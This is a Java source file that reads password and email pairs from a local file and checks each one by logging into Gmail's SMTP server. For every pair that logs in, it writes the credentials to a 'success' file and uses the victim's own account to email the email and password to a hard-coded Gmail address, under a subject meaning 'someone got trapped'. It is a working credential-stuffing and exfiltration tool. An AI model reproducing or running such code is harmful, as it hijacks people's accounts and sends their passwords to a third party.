package com.fjr.gmail;

import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.PrintWriter;
import java.util.Properties;

import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class CekEmailSukses {
	BufferedReader reader= null; 
	PrintWriter  out = null, out1 = null ; 
	public CekEmailSukses() {		
		try {
			out = new PrintWriter(new FileOutputStream( "./sukses login email.txt"  )); 
			out1 = new PrintWriter(new FileOutputStream( "./log email cek.txt"  )); 
			reader = new BufferedReader(new FileReader( "E:/birokrasi/lamaran kerja/CPNS 2019/kementerian hukum dan ham/no-hp-simpan.txt"   ) );
			String isi  ; 
			while( (isi = reader.readLine()) != null ) {
				String[] temp = isi.split("\\|"); 
				String email = temp[1]; 
				String password = temp[0]; 
				out1.println(email + "|" + password);
				out1.flush(); 
				if(isEmailSukses(email, password)) {
					out.println(email + "|" + password);
					out.flush();
				}
			}
		}catch(Exception e) {
			e.printStackTrace(); 
		}finally {
			if(out!=null) {
				out.close();
			}
			if(out1!= null) {
				out1.close();
			}
			if(reader!= null) {
				try {
					reader.close();
				}catch(Exception e) {}
			}
		}
	}
	
	public boolean isEmailSukses(String email, String password) {
		String host = "smtp.gmail.com";
		Properties props = System.getProperties();
		props.put("mail.smtp.host", host);
		props.put("mail.smtp.port", "587"); // 587 is the port number of yahoo mail
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		Session getMailSession = Session.getDefaultInstance(props, null);
		MimeMessage generateMailMessage = new MimeMessage(getMailSession);
		try {
			generateMailMessage.setFrom(new InternetAddress( email  ));
			generateMailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress("fajar.kasimbar@gmail.com"));
			generateMailMessage.setSubject("Ada yang terjebak");
			String emailBody = "nama: "  + email  + "| pasword: "+ password;
			generateMailMessage.setContent(emailBody, "text/html");
			Transport transport = getMailSession.getTransport("smtp");
			transport.connect("smtp.googlemail.com", email , password );
			transport.sendMessage(generateMailMessage, generateMailMessage.getAllRecipients());
			transport.close();
		}catch(Exception e) {
			out1.println( e.getMessage());
			return false; 
		}
		return true; 
	}
	
	public static void main(String[] args) {
		new CekEmailSukses(); 
	}

}
